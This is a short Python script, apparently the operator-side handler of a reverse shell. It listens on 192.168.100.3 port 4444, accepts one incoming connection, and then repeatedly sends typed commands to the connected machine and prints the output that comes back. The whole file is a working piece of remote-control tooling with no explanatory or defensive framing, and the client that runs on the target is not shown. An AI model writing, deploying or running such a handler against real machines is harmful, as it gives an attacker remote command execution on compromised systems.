import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.100.3", 4444))
listener.listen(0)
print("[+] Waiting for incoming connections...")
connection, address = listener.accept()
print("[+] Got a connection from " + str(address))

while True:
    command = input(">> ")
    connection.send(bytes(command, encoding='utf8'))
    result = connection.recv(1024)
    print(result.decode('cp866'))
